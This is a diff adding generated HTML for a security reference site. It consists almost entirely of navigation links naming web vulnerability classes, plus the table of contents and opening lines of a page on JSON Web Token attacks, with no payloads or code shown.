+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_39_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_39">
+          <span class="md-nav__icon md-icon"></span>
+          Race Condition
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20Condition/" class="md-nav__link">
+        Race Condition
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_40" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_40" id="__nav_40_label" tabindex="0">
+          Request Smuggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_40_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_40">
+          <span class="md-nav__icon md-icon"></span>
+          Request Smuggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Request%20Smuggling/" class="md-nav__link">
+        Request Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_41" id="__nav_41_label" tabindex="0">
+          SAML Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_41_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_41">
+          <span class="md-nav__icon md-icon"></span>
+          SAML Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SAML%20Injection/" class="md-nav__link">
+        SAML Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_42" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42" id="__nav_42_label" tabindex="0">
+          SQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_42_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_42">
+          <span class="md-nav__icon md-icon"></span>
+          SQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/" class="md-nav__link">
+        SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
+        Google BigQuery SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
+        Cassandra Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
+        DB2 Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
+        Hibernate Query Language Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
+        MSSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
+        MYSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
+        Oracle SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
+        PostgreSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
+        SQLite Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_43" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_43" id="__nav_43_label" tabindex="0">
+          Server Side Include Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_43_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_43">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Include Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Include%20Injection/" class="md-nav__link">
+        Server Side Include Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_44" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_44" id="__nav_44_label" tabindex="0">
+          Server Side Request Forgery
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_44_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_44">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Request Forgery
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Request%20Forgery/" class="md-nav__link">
+        Server-Side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_45" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_45" id="__nav_45_label" tabindex="0">
+          Server Side Template Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_45_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_45">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Template Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Template%20Injection/" class="md-nav__link">
+        Server Side Template Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_46" id="__nav_46_label" tabindex="0">
+          Tabnabbing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_46_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_46">
+          <span class="md-nav__icon md-icon"></span>
+          Tabnabbing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Tabnabbing/" class="md-nav__link">
+        Tabnabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_47" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_47" id="__nav_47_label" tabindex="0">
+          Type Juggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_47_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_47">
+          <span class="md-nav__icon md-icon"></span>
+          Type Juggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Type%20Juggling/" class="md-nav__link">
+        Type Juggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48" id="__nav_48_label" tabindex="0">
+          Upload Insecure Files
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_48_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48">
+          <span class="md-nav__icon md-icon"></span>
+          Upload Insecure Files
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/" class="md-nav__link">
+        Upload Insecure Files
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_2" id="__nav_48_2_label" tabindex="0">
+          CVE Ffmpeg HLS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_2_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_2">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Ffmpeg HLS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
+        FFmpeg HLS vulnerability
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_3" id="__nav_48_3_label" tabindex="0">
+          Configuration Apache .htaccess
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_3">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Apache .htaccess
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
+        .htaccess upload
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_4" id="__nav_48_4_label" tabindex="0">
+          Configuration Busybox httpd.conf
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_4">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Busybox httpd.conf
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_5" id="__nav_48_5_label" tabindex="0">
+          Configuration uwsgi.ini
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_5">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration uwsgi.ini
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Configuration%20uwsgi.ini/" class="md-nav__link">
+        uWSGI configuration file
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_6" id="__nav_48_6_label" tabindex="0">
+          Extension Flash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_6">
+          <span class="md-nav__icon md-icon"></span>
+          Extension Flash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_7" id="__nav_48_7_label" tabindex="0">
+          Picture ImageMagick
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_7">
+          <span class="md-nav__icon md-icon"></span>
+          Picture ImageMagick
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Picture%20ImageMagick/" class="md-nav__link">
+        ImageMagick Exploits
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_8" id="__nav_48_8_label" tabindex="0">
+          Zip Slip
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_8">
+          <span class="md-nav__icon md-icon"></span>
+          Zip Slip
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
+        Zip Slip
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_49" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_49" id="__nav_49_label" tabindex="0">
+          Web Cache Deception
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_49_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_49">
+          <span class="md-nav__icon md-icon"></span>
+          Web Cache Deception
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Cache%20Deception/" class="md-nav__link">
+        Web Cache Deception
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_50" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_50" id="__nav_50_label" tabindex="0">
+          Web Sockets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_50_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_50">
+          <span class="md-nav__icon md-icon"></span>
+          Web Sockets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Sockets/" class="md-nav__link">
+        Web Sockets
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_51" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_51" id="__nav_51_label" tabindex="0">
+          XPATH Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_51_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_51">
+          <span class="md-nav__icon md-icon"></span>
+          XPATH Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XPATH%20Injection/" class="md-nav__link">
+        XPATH Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_52" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_52" id="__nav_52_label" tabindex="0">
+          XSLT Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_52_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_52">
+          <span class="md-nav__icon md-icon"></span>
+          XSLT Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSLT%20Injection/" class="md-nav__link">
+        XSLT Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_53" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_53" id="__nav_53_label" tabindex="0">
+          XSS Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_53_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_53">
+          <span class="md-nav__icon md-icon"></span>
+          XSS Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/" class="md-nav__link">
+        Cross Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
+        XSS in Angular and AngularJS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
+        XSS with Relative Path Overwrite - IE 8/9 and lower
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_54" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_54" id="__nav_54_label" tabindex="0">
+          XXE Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_54_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_54">
+          <span class="md-nav__icon md-icon"></span>
+          XXE Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XXE%20Injection/" class="md-nav__link">
+        XML External Entity
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_55" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_55" id="__nav_55_label" tabindex="0">
+           LEARNING AND SOCIALS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_55_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_55">
+          <span class="md-nav__icon md-icon"></span>
+           LEARNING AND SOCIALS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_LEARNING_AND_SOCIALS/BOOKS/" class="md-nav__link">
+        Books
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_LEARNING_AND_SOCIALS/TWITTER/" class="md-nav__link">
+        Twitter
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_LEARNING_AND_SOCIALS/YOUTUBE/" class="md-nav__link">
+        Youtube
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_56" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_56" id="__nav_56_label" tabindex="0">
+           template vuln
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_56_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_56">
+          <span class="md-nav__icon md-icon"></span>
+           template vuln
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../_template_vuln/" class="md-nav__link">
+        Vulnerability Title
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-format" class="md-nav__link">
+    JWT Format
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT Format">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#header" class="md-nav__link">
+    Header
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    Payload
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-signature" class="md-nav__link">
+    JWT Signature
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT Signature">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-null-signature-attack-cve-2020-28042" class="md-nav__link">
+    JWT Signature - Null Signature Attack (CVE-2020-28042)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-disclosure-of-a-correct-signature-cve-2019-7644" class="md-nav__link">
+    JWT Signature - Disclosure of a correct signature (CVE-2019-7644)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-none-algorithm-cve-2015-9235" class="md-nav__link">
+    JWT Signature - None Algorithm (CVE-2015-9235)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-key-confusion-attack-rs256-to-hs256-cve-2016-5431" class="md-nav__link">
+    JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signature-key-injection-attack-cve-2018-0114" class="md-nav__link">
+    JWT Signature - Key Injection Attack (CVE-2018-0114)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-secret" class="md-nav__link">
+    JWT Secret
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT Secret">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#encode-and-decode-jwt-with-the-secret" class="md-nav__link">
+    Encode and Decode JWT with the secret
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#break-jwt-secret" class="md-nav__link">
+    Break JWT secret
+  </a>
+  
+    <nav class="md-nav" aria-label="Break JWT secret">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-tool" class="md-nav__link">
+    JWT tool
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hashcat" class="md-nav__link">
+    Hashcat
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-claims" class="md-nav__link">
+    JWT Claims
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT Claims">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-kid-claim-misuse" class="md-nav__link">
+    JWT kid Claim Misuse
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwks-jku-header-injection" class="md-nav__link">
+    JWKS - jku header injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#labs" class="md-nav__link">
+    Labs
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="jwt-json-web-token">JWT - JSON Web Token</h1>
+<blockquote>
+<p>JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.</p>
+</blockquote>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#tools">Tools</a></li>
+<li><a href="#jwt-format">JWT Format</a></li>
+<li><a href="#header">Header</a></li>
+<li><a href="#payload">Payload</a></li>
+<li><a href="#jwt-signature">JWT Signature</a><ul>
+<li><a href="#jwt-signature---null-signature-attack-cve-2020-28042">JWT Signature - Null Signature Attack (CVE-2020-28042)</a></li>
